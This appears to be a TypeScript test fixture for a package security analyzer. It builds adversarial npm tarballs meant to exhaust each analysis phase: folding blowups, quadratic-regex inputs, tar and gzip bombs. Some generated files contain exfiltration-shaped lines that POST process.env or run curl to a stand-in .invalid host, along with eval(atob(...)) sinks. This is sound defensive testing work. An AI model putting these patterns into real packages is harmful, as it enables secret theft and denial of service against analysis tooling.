// Generators of packages built to make one phase of the analysis do as much work as it can for its size: the review's
// cases at 90b3072 and one or more for every phase the work meter (src/meter.ts) charges. Each takes a size `n` and
// gives a tarball's bytes, so the whole path from gunzip to the score is under the meter. Every payload is an inert
// string: nothing here runs, and no host is contacted (the URLs are reserved `.invalid` names).
import { gzipSync } from "node:zlib";

/** The files of a package, or a tarball built by hand when the archive itself is the attack. */
export type Built = { kind: "files"; files: Record<string, string> } | { kind: "tarball"; bytes: Uint8Array };

export type Generator = {
  /** A stable name, for the test title and the property test's report. */
  name: string;
  /** The phase it is built to load. */
  phase: string;
  /** Whether it reproduces a finding of the review at 90b3072. */
  review?: string;
  /** A size that spends a few million units; the property test scales from there. */
  base: number;
  /**
   * A size that runs a 10-million-unit meter out. Absent for a generator a limit of its own stops first: the archive
   * caps (48 MB inflated), the fold allowance, or the manifest's size.
   */
  over?: number;
  make: (n: number) => Built;
};

const MANIFEST = { name: "adversarial-probe", version: "1.0.0", license: "MIT", main: "index.js" };

const files = (fs: Record<string, string>): Built => ({ kind: "files", files: fs });

/** One tar header block for `name` of `size` bytes and `type` ("0" a file, "x" a PAX header). */
function header(name: string, size: number, type: string): Uint8Array {
  const h = new Uint8Array(512);

  const put = (s: string, at: number): void => {
    for (let i = 0; i < s.length; i++) h[at + i] = s.charCodeAt(i) & 0xff;
  };

  put(name.slice(0, 99), 0);
  put("0000644\0", 100);
  put("0000000\0", 108);
  put("0000000\0", 116);
  put(`${size.toString(8).padStart(11, "0")}\0`, 124);
  put("00000000000\0", 136);
  put("        ", 148);
  put(type, 156);
  put("ustar\0", 257);
  put("00", 263);
  let sum = 0;

  for (const b of h) sum += b;
  put(`${sum.toString(8).padStart(6, "0")}\0 `, 148);

  return h;
}

/** A tar archive of `entries` (bytes as given), gzipped. */
export function tgz(entries: readonly { name: string; data: Uint8Array; type?: string }[]): Uint8Array {
  const parts: Uint8Array[] = [];

  for (const e of entries) {
    parts.push(header(e.name, e.data.length, e.type ?? "0"), e.data, new Uint8Array((512 - (e.data.length % 512)) % 512));
  }

  parts.push(new Uint8Array(1024));
  const total = parts.reduce((n, p) => n + p.length, 0);
  const tar = new Uint8Array(total);
  let at = 0;

  for (const p of parts) {
    tar.set(p, at);
    at += p.length;
  }

  return new Uint8Array(gzipSync(tar, { level: 1 }));
}

const enc = (s: string): Uint8Array => new TextEncoder().encode(s);

/** A tarball of `fs`, with package.json first. */
export function tarballOf(fs: Record<string, string>): Uint8Array {
  return tgz([{ name: "package/package.json", data: enc(JSON.stringify(MANIFEST)) }, ...Object.entries(fs).map(([p, t]) => ({ name: `package/${p}`, data: enc(t) }))]);
}

export const PROBE_MANIFEST = MANIFEST;

const rep = (n: number, f: (i: number) => string, sep = "\n"): string => Array.from({ length: n }, (_, i) => f(i)).join(sep);

export const GENERATORS: readonly Generator[] = [
  // ----- the review's cases -----
  {
    name: "fold-doubling",
    phase: "fold",
    review: "P1 constant folding expands without limit (js.ts:1775)",
    base: 23,
    make: (n) => files({ "index.js": `const s0="a";${rep(n, (i) => `const s${i + 1}=s${i}+s${i};`, "")}require(s${n});` }),
  },
  {
    name: "fold-template-join",
    phase: "fold",
    base: 22,
    make: (n) => files({ "index.js": `const t0="ab";${rep(n, (i) => `const t${i + 1}=\`\${t${i}}\${t${i}}\`;`, "")}const j=[t${n},t${n},t${n}].join(t${n});eval(j.concat(j));` }),
  },
  {
    name: "flow-calls-one-function",
    phase: "flow",
    review: "P1 flow indexing copied growing arrays (flow.ts:337)",
    base: 6000,
    over: 48_000,
    make: (n) => files({ "index.js": `function f(a){return a}\n${rep(n, (i) => `f(process.env.K${i});`)}` }),
  },
  {
    name: "flow-written-files",
    phase: "flow",
    review: "P1 written-file matching scans were uncharged",
    base: 800,
    over: 800,
    make: (n) => files({ "index.js": `const fs=require('fs');const cp=require('child_process');\n${rep(n, (i) => `fs.writeFileSync('./out/${"d".repeat(40)}${i}.js', 'x${i}');`)}\n${rep(n, (i) => `require('./out/${"d".repeat(40)}${i}.js');cp.execFile('./bin/${i}');`)}` }),
  },
  {
    name: "cross-file-dag",
    phase: "cross-file",
    review: "P1 cross-file exhaustion was not enforced at every step",
    base: 400,
    over: 4_000,
    make: (n) => {
      const entries: [string, string][] = [["index.js", `const {a}=require('./l0a.js');const {b}=require('./l0b.js');fetch('https://x.invalid',{method:'POST',body:a+b});`]];

      for (let i = 0; i < n; i++) {
        const next = i + 1 < n ? `require('./l${i + 1}a.js')` : "{a:process.env,b:process.env}";

        entries.push([`l${i}a.js`, `const m=${next};const o=${i + 1 < n ? `require('./l${i + 1}b.js')` : "m"};module.exports={a:m.a||o.b,b:o.b||m.a};`]);
        entries.push([`l${i}b.js`, `const m=${next};module.exports={a:m.a,b:m.b};`]);
      }

      return files(Object.fromEntries(entries));
    },
  },
  {
    name: "pax-repeated-digits",
    phase: "tar",
    review: "P1 quadratic regex in PAX parsing (core/src/tarball.ts:133)",
    base: 2_000_000,
    make: (n) => ({ kind: "tarball", bytes: tgz([{ name: "package/PaxHeader", data: enc("9".repeat(n)), type: "x" }, { name: "package/package.json", data: enc(JSON.stringify(MANIFEST)) }]) }),
  },
  {
    name: "atob-past-decoded-budget",
    phase: "decode",
    review: "P2 built-in decoder exhaustion passed as a note (js.ts:1873)",
    base: 7,
    over: 100,
    make: (n) => files({ "index.js": `const sink=(x)=>eval(x);\n${rep(n, (i) => `sink(atob("${Buffer.from(`/*${i}*/${"void 0;".repeat(8_500)}`).toString("base64").slice(0, 60_000)}"));`)}` }),
  },
  // ----- one or more per phase -----
  {
    name: "gunzip-zeros",
    phase: "gunzip",
    base: 40 * 1024 * 1024,
    make: (n) => ({ kind: "tarball", bytes: tgz([{ name: "package/package.json", data: enc(JSON.stringify(MANIFEST)) }, { name: "package/zeros.bin", data: new Uint8Array(n) }]) }),
  },
  {
    name: "tar-many-entries",
    phase: "tar",
    base: 40_000,
    make: (n) => ({ kind: "tarball", bytes: tgz([{ name: "package/package.json", data: enc(JSON.stringify(MANIFEST)) }, ...Array.from({ length: n }, (_, i) => ({ name: `package/d/${i}.txt`, data: enc("x") }))]) }),
  },
  {
    name: "parse-syntax-error-at-end",
    phase: "parse",
    base: 200_000,
    over: 800_000,
    make: (n) => files({ "index.js": `${rep(n, (i) => `a${i % 97}(b,c);`, "")}\n@@` }),
  },
  {
    name: "parse-typescript",
    phase: "parse",
    base: 25_000,
    over: 100_000,
    make: (n) => files({ "index.ts": `${rep(n, (i) => `export const v${i}: Array<Map<string, number>> = f<T${i % 7}>(x as unknown as Y);`)}\n@@` }),
  },
  {
    name: "scope-deep-nesting",
    phase: "scope",
    // past a few thousand levels no parser has the stack for it, and the file is read raw: cheap, so no size here runs
    // the meter out (parse-deep-many-files does, with many files just under that depth)
    base: 1_500,
    make: (n) => files({ "index.js": `${"(function(){".repeat(n)}${rep(n, (i) => `q${i % 50}`, ";")}${"})();".repeat(n)}` }),
  },
  {
    name: "parse-deep-many-files",
    phase: "parse",
    base: 200,
    over: 1_500,
    make: (n) => {
      const deep = (d: number): string => `${"(function(){".repeat(d)}${rep(d, (i) => `q${i % 50}`, ";")}${"})();".repeat(d)}`;

      return files(Object.fromEntries(Array.from({ length: n }, (_, i) => [i % 2 === 0 ? `lib/f${i}.js` : `lib/f${i}.ts`, deep(200 + (i % 7) * 100)])));
    },
  },
  {
    name: "read-member-chains",
    phase: "read",
    base: 40_000,
    over: 160_000,
    make: (n) => files({ "index.js": `const o={a:{b:{c:{d:require}}}};\n${rep(n, (i) => `o.a.b.c.d(x${i % 13}).y.z.w;`)}` }),
  },
  {
    name: "text-dollar-runs",
    phase: "text",
    review: "found here: `\\b[\\w$]+` in importsOf restarted at every `a$` (quadratic)",
    base: 4_000_000,
    over: 16_000_000,
    make: (n) => files({ "index.txt": "a$".repeat(n / 2), "run.sh": "$(".repeat(n / 4) }),
  },
  {
    name: "text-whitespace-and-quotes",
    phase: "text",
    base: 4_000_000,
    over: 16_000_000,
    make: (n) => files({ "notes.txt": `${" ".repeat(n / 2)}'${"A".repeat(n / 4)}` + "//:_auth=".repeat(n / 64), ".npmrc": "\n".repeat(n / 8) + "////".repeat(n / 16) }),
  },
  {
    name: "tokens-raw-many-errors",
    phase: "text",
    base: 600_000,
    over: 2_400_000,
    make: (n) => files({ "index.js": rep(n / 10, (i) => `x${i}=1;#`, "") }),
  },
  {
    name: "lineof-many-findings",
    phase: "text",
    base: 2_000_000,
    over: 8_000_000,
    make: (n) => files({ "index.js": `${"\n".repeat(n)}${rep(400, (i) => `process.env.TOKEN_${i};require('child_process').exec('curl https://x.invalid/${i}');`)}` }),
  },
  {
    name: "decoder-heavy-strings",
    phase: "decode",
    base: 30,
    over: 240,
    make: (n) => files({ "index.js": `function g(h){return h.split('').map(c=>h[0]+c).join('').split('').reverse().join('').slice(0,9)}\n${rep(n, (i) => `require(g('${String.fromCharCode(97 + (i % 26)).repeat(20_000)}'));`)}` }),
  },
  {
    name: "held-nested-eval",
    phase: "held",
    base: 200,
    over: 1_600,
    make: (n) => files({ "index.js": rep(n, (i) => `eval("eval(\\"eval('var q${i}=${"1+".repeat(300)}1')\\")");`) }),
  },
  {
    name: "held-recovered-comments",
    phase: "held",
    base: 3_000,
    over: 48_000,
    make: (n) => files({ "index.js": `${rep(n, (i) => `/* fetch('https://x.invalid/${i}') */ function f${i}(){}`)}\n${rep(Math.min(n, 300), (i) => `eval(String(f${i}));`)}` }),
  },
  {
    name: "flow-long-member-names",
    phase: "flow",
    base: 400,
    over: 1_600,
    make: (n) => {
      const name = "m".repeat(4_000);

      return files({ "index.js": `function h(p){return p.${name}.${name}}\n${rep(n, (i) => `fetch('https://x.invalid',{body:h(h({${name}:process.env.K${i}}))});`)}` });
    },
  },
  {
    name: "score-many-files",
    phase: "score",
    base: 8_000,
    over: 32_000,
    make: (n) => files(Object.fromEntries(Array.from({ length: n }, (_, i) => [`lib/f${i}.js`, `module.exports=require('./f${(i + 1) % n}.js');process.env.A${i};`]))),
  },
  {
    name: "glob-many-stars",
    phase: "score",
    base: 40,
    make: (n) => ({
      kind: "tarball",
      bytes: tgz([
        { name: "package/package.json", data: enc(JSON.stringify({ ...MANIFEST, exports: { [`./${"*".repeat(1)}`]: `./${"a*".repeat(n)}b` }, scripts: { postinstall: `npm-run-all ${"*a".repeat(n)}`, [`${"a".repeat(60)}`]: "true" }, apm: { env: [`${"A*".repeat(n)}Z`] } })) },
        { name: "package/index.js", data: enc(`process.env.${"A".repeat(200)};`) },
        ...Array.from({ length: 200 }, (_, i) => ({ name: `package/${"a".repeat(80)}${i}`, data: enc("1") })),
      ]),
    }),
  },
];
